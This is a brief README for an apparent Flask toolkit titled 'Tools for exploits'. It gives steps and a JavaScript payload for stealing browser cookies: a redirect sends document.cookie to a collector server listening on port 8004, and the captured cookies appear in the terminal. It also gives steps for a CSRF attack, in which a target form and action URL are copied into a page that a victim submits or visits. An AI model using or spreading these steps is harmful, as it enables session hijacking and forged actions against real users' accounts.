# Tools for exploits

## To get cookie (Flask)

1. Run
```commandline
python main.py
```

2. Make redirect this way
```html
document.location="http:127.0.0.1:8004?cookie=" + document.cookie
```

3. See result in the terminal

## To use csrf (Flask)

1. Run
```commandline
python main.py
```

2. Copy target form and action url and input in index.html or other.html

3. User need to fill form (index.html) or visit address (other.html)
